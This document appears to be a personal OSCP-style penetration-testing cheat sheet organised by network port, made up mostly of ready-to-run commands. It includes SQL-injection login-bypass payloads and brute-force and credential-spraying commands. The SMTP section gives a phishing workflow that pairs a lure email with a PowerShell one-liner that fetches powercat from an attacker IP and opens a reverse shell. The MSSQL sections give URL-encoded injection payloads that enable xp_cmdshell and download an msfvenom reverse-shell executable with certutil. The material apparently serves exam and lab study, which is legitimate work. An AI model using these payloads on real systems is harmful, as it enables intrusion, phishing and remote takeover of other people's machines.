## Ports
### Links

- [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html)
- [HackTricks 80](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web)
- [SMB Enum Guide](https://steflan-security.com/smb-enumeration-guide/)
- [AutoBlueSMB](https://github.com/3ndG4me/AutoBlue-MS17-010.git)
- [FTP Enum](https://steflan-security.com/ftp-enumeration-guide/)
- [HackTricks 53](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns)
- [HackTricks 22](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh)
- [NetCat Email](https://www.linuxjournal.com/content/sending-email-netcat)
- [Netcat SMTP](https://infosecwriteups.com/what-do-netcat-smtp-and-self-xss-have-in-common-stored-xss-a05648b72002)
- [MSSQL HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
- [Evil WinRM Guide](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/)
### <ins>80/443 - HTTP</ins>

#### First Thing

```

1. Directory busting: dirb http:///<IP>/ 

2. Directory busting: gobuster dir -x php,txt,xml,asp,aspx --url http://<IP>/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -b 404 -f 

3. Directory busting: ffuf -c -u http:///FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

4. Vulnerability Scan: nmap <IP> -p80 -script vuln -Pn

5. Vulnerability Scan: nikto -host http://<IP>/ 

6. WordPress Scan: wpscan --url http://<IP>/

```

#### While Scans run:

```
1. Try Weak Credentials, Default Login, Intercept Request in Burp, and Try Dictionary attack to crack the credentials, Try SQLi 

2. Check the Source code if anything Juicy

3. If you see any CMS (Joomla, WordPress, Tomcat, etc), visit my go-to website here

4. Sometimes you also find creds in CMS's Github. Also, look for config files, and Readme files which can reveal sensitive info.

5. If you find SQLi, LFI/RFI, or File Uploads then go to respectice section in Gaining Access.

8. Note all the usernames + keywords, sometimes cewl tool helps for cracking the password

9. Find exploits using keywords in the following manner: keyword poc, keyword GitHub, keyword htb, keyword hack the box

```

#### Default Creds Login Page
| User | Pass |
| ---- | ---- |
| admin | admin |
| admin | password |
| admin | 1234 |
| admin | 123456 |
| root | toor |
| test | test |
| guest | guest |
| anonymous | anonymous |
#### SQL Injection
| User | Pass |
| ---- | ---- |
| tom | tom |
| tom | ' or '1'='1 |
| tom | ' or 1='1 |
| tom | 1' or 1=1 -- - |
| ' or '1'='1 | ' or '1'='1 |
| ' or ' 1=1 | ' or ' 1=1 |
| 1' or 1=1 -- - | blah |
| whatever' or '1'='1 | whatever' or '1'='1 |

### <ins>139/445 - SMB</ins>

#### Try
```
1. Find SMB Version: 
	1. tcpdump -i tun0 port <Victim Port> and src <Victim IP> -s0 -A -n 2>/dev/null 
	2. crackmapexec smb <Victim IP> --shares --port <Victim Port> 1>/dev/null 2>/dev/null

2. Nmap Scan: nmap --script "safe or smb-enum-*" -p 445 <IP>

3. Shares: smbclient -L \\\\<IP>\\

4. Changing Shares: smbclient -L \\\\<IP>\\C$

5. Lists file with permissions: smbmap -H <IP>

6. Downloading: smbget -R smb://<IP>/anonymous

7. type prompt off, recurse on -> lets us download all the files using mget *

8. Nmap Vuln Script: nmap --script "smb-vuln*" -p 139,445 <IP>

9. crackmapexec smb <IP>

10. Users: crackmapexec smb <IP> --users

11. Shares: crackmapexec smb <IP> --shares

12. Try Crackmapexec, psexec, smbexec, wmiexec
```

#### If we have Username and Password
```
1. Authenticated SMB Shares: smbclient \\\new-site -U <domain_name\username>

2. Null login: crackmapexec smb <IP> --shares -u ' ' -p ''
3. Null login: crackmapexec smb <IP> --shares -u '' -p ''

4. Null login: crackmapexec smb <IP> -u ' ' -p ''

5. Default Guest login: crackmapexec smb <IP> -u 'guest' -p ''

6. LDAP search:  ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h <IP> | grep -i samaccountname: | cut -f 2 -d " "

7. Auth Check: crackmapexec smb <IP> -u <user> -p <pass> --local-auth

8. Auth Check: crackmapexec smb <IP> -u <user> -p <pass>

9. crackmapexec smb 192.168.214.249 -u /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/wordlists/seclists/Passwords/darkweb2017-top100.txt -d relia.com --continue-on-success 
```

### <ins>21 - FTP</ins>

```
1. Try FTP Default creds - anonymous:anonymous / admin:admin

2. Once you log in, type passive and binary for file transfer modes

3. If anonymous login -> create a payload, upload and try visit <IP>/exploit.asp

4. FTP Login: ftp <username>@<IP>

5. Banner Grabbing: nc -nv <IP> 21

6. Grab Cert: openssl s_client -connect <IP>:21 -starttls ftp

7. Download all the files in share: wget -m ftp://anonymous:anon@<IP>

8. Download all: wget -m --no-passive ftp://:@<IP>

9. Different port: ftp <IP> -P 3084

10. Bruteforce: hydra [-L <users.txt> or -l <user_name>] [-P <pass.txt> or -p ] -f  ftp://<IP>:<PORT>

11. If it's a Microsoft server -> Try asp, aspx payloads. Try staged/stageless, x32/x64 payloads.

12. Check if we can overwrite stuff and upload files to make it work. Look at the permissions.

13. Look for hidden files, go back to a directory if you find anything, and look for creds in DB Files.

14. Don't forget about TFTP on UDP Port 69
	1. nmap -Pn -sU -p69 --script tftp-enum 192.168.10.250
	2. https://github.com/EnableSecurity/tftptheft
```

### <ins>53 - DNS</ins>

```
1. nslookup: nslookup --- SERVER <IP> --- 127.0.0.1

2. God command: dig @<IP> any <domain_name>

3. God command: dig axfr <domain_name> @<IP>

4. Nmap: nmap -n --script "(default and dns) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" <IP>

5. DNSRecon: dnsrecon -d <domain_name> -n <IP>

6. DNSEnum: dnsenum <domain_name>

7. Nmap Zone Transfer: nmap --script=dns-zone-transfer -p 53 <domain_name>

```

### <ins>22 - SSH</ins>

```

1. SSH Login: ssh <username>@<IP>

2. Non-default port: ssh <username>@<IP> -p 2222

3. Banner Grabbing: nc -vn <IP> 22

4. Public SSH key of server: ssh-keyscan -t rsa <IP> -p <PORT>

5. When you have the id_rsa key: chmod 600 id_rsa then ssh -i id_rsa <USER>@<IP>

6. Retrieve weak keys: nmap -p22 <IP> --script ssh-hostkey --script-args ssh_hostkey=full

7. Bruteforcing SSH: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <IP> ssh -t 4 -V

8. After initial access, find ssh keys in linux: find / -name ssh 2>/dev/null
```

### <ins>389/636/3268 - LDAP</ins>

```
1. Domain name: nmap -n -sV --script "ldap* and not brute" <IP>

2. Banner Grabbing: nmap -p 389 --script ldap-search -Pn <IP>

3. Ldap Naming Context: ldapsearch -x -H ldap://<IP> -s base namingcontexts

4. Sometimes passwords can be found here: ldapsearch -x -H ldap://<IP> -s sub -b 'dc=<>,dc=<>' #From the naming context

5. Dump: ldapsearch -H ldap://<IP> -x -b "{Naming_Context}"

6. Base LdapSearch: ldapsearch -H ldap://<IP> -x

7. Find usernames: ldapsearch -H ldap://<IP> -x -b "DC=<>,DC=<>" '(objectClass=Person)'

8. Find usernames: ldapsearch -H ldap://10.10.10.161 -x -b "DC=<>,DC=<>" '(objectClass=user)' sAMAccountName

9. Hydra: hydra -l <Username> -P <Big_Passwordlist> <IP> ldap2 -V -f
LDAP Login: ldapdomaindump <IP> [-r <IP>] -u '<domain\user>' -p '<pass>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]


```

### <ins>161 - SNMP</ins>

```

1. Nmap: sudo nmap -sU --open -p 161 10.11.1.1-254 (find ip with SMTP open)

2. onesixtyone bruteforce tool: for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips then, onesixtyone -c community -i ips

3. Enumerating Entire MIB Tree: snmpwalk -c public -v1 -t 10 <IP>

4. Enumerating Windows Users: snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25

5. Enumerating Running Windows Processes: snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2

6. Enumerating Open TCP Ports: snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3

```

### <ins>25 - SMTP</ins>

```
1. To find Users: nmap --script smtp-enum-users.nse -p 25,465,587 <IP>
2. If Anonymous Login is allowed we can use Netcat to send Phishing emails through SMTP.

OSCP Mail Hack

Run WebDAv Server
1. wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/Desktop/pen200/relia/webdav/

On Windows setup config and shortcut

Make a file named "config.Library-ms"

<?xml version="1.0" encoding="UTF-8"?> <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"> <name>@windows.storage.dll,-34582</name> <version>6</version> <isLibraryPinned>true</isLibraryPinned> <iconReference>imageres.dll,-1003</iconReference> <templateInfo> <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType> </templateInfo> <searchConnectorDescriptionList> <searchConnectorDescription> <isDefaultSaveLocation>true</isDefaultSaveLocation> <isSupported>false</isSupported> <simpleLocation> <url>http://192.168.45.219</url> </simpleLocation> </searchConnectorDescription> </searchConnectorDescriptionList> </libraryDescription>

Drop a powershell reverse shell into a shortcut key in the same folder, hope they click it:

powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.219:9090/powercat.ps1'); powercat -c 192.168.45.219 -p 4444 -e powershell"

Create a body for email

body.txt
---
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists
in the Git logs. I'll remove it for security reasons.
On an unrelated note, please install the new security features on your workstation.
For this, download the attached file, double-click on it, and execute the
configuration shortcut within. Thanks!
John

Make sure nc is setup and run this:

1. sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.223.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap




```

### <ins>3389 - RDP</ins>

```
If you get RDP, first transfer nc.exe (windows) or netcat (Linux) to get the shell back on our attacking machine.

1. Xfreerdp: xfreerdp /v:<IP> /u:<USER> /d:<DOMAIN> /p:<PASS> +clipboard /dynamic-resolution /drive:/opt,share

2. rdesktop -u <username> <IP>

3. rdesktop -d <domain> -u <username> -p <pass> <IP>

4. psexec: impacket-psexec <user>:<pass>@<IP> 

5. smbclient: smbclient \\\\<IP>\\ -U <user> 

6. Nmap: nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>

7. Bruteforce: hydra -L <users.txt> -p <pass.txt> <IP> rdp

8. smbmap: smbmap -d <domain> -u <user> -p <pass> -H <IP> 

9. wmiexec: impacket-wmiexec <domain>/<user>:<pass>@<IP>


```

### <ins>135/593 - RPC</ins>

```

1. Null login: rpcclient <IP> -U ''

2. Try enumdomusers, enumdomgroups, and querydispinfo to enumerate once you are in
rpcclient -U "" -N <IP>

3. Try without a password: rpcclient -U "" <IP>

4. Dump: impacket-rpcdump -p 135 <IP>

```

### <ins>5985/5986 - Evil-winrm</ins>

```
1. Check: crackmapexec --verbose winrm <IP> -u <username> -p <password>

2. Try both ports: evil-winrm -i <IP> -u <username> -p <password> -p <port>

3. Powershell session: evil-winrm -i <IP> -u <username> -p <password>

4. Pass the hash (NTLM): evil-winrm -i <IP> -u <username> -H <hash>

5. Exfil data using Evil-winrm: download <File to be exfiltrated location> <Local location where it should be exfiltrated>


```

### <ins>3306 - MYSQL</ins>

```
1. MYSQL Login: mysql -h <IP> -u <username> -p <pass> -P <port>

2. Nmap Vulnerability scan: nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>

3. Login: sqsh -S <IP> -U <username> -P <password> -D <database>

```

#### xp_cmdshell -> RCE

```
sqsh -S <IP> -U <Username> -P <Password> -D <Database>

In sqsh, you need to use GO after writing the query to send it
Do one by one each command:

# Get users that can run xp_cmdshell
Use master
EXEC sp_helprotect 'xp_cmdshell'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE

# This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
EXEC master..xp_cmdshell 'whoami'

-----------------------------------------------------
# Enabling xp_cmdshell for SQL Server 2005
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
-----------------------------------------------------

'EXECUTE sp_configure 'show advanced options', 1; --
'RECONFIGURE; --
'EXECUTE sp_configure 'xp_cmdshell', 1; --
'RECONFIGURE; --
'EXECUTE xp_cmdshell 'certutil -urlcache -f 192.168.45.181:80/test.exe'; --

-----------------------------------------------------

msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o test.exe
'%3bEXEC%20sp_configure%20'show%20advanced%20options'%2c%201%3b--
'%3bRECONFIGURE%3b--
'%3bEXEC%20sp_configure%20'xp_cmdshell',1%3b--
'%3bRECONFIGURE%3b--
'%3bEXEC+xp_cmdshell+'whoami'%3b--
'%3bEXEC%20xp_cmdshell%20"net user"%3b--
python3 -m http.server 80
'EXEC+xp_cmdshell+'certutil+-urlcache+-f+192.168.45.181%3a80/test.exe'%3b--
nc -nvlp 4444
admin'EXEC+xp_cmdshell+'c%3a\\inetpub\\wwwroot\\test.exe%3b--

```

### <ins>1433 - MSSQL</ins>

```

1. Login: sqsh -S <IP> -U <username> -P "<pass>"

2. Login: sqsh -S <IP> -U .\\<Username> -P <pass> -D <database>

3. Login: impacket-mssqlclient :<username>:<pass>@<IP> -windows-auth

4. Login: impacket-mssqlclient :<username>:<pass>@<IP> -local-auth

```

#### xp_cmdshell -> RCE

```
sqsh -S <IP> -U <Username> -P <Password> -D <Database>

In sqsh, you need to use GO after writing the query to send it
Do one by one each command:

# Get users that can run xp_cmdshell
Use master
EXEC sp_helprotect 'xp_cmdshell'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE

# This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
EXEC master..xp_cmdshell 'whoami'

```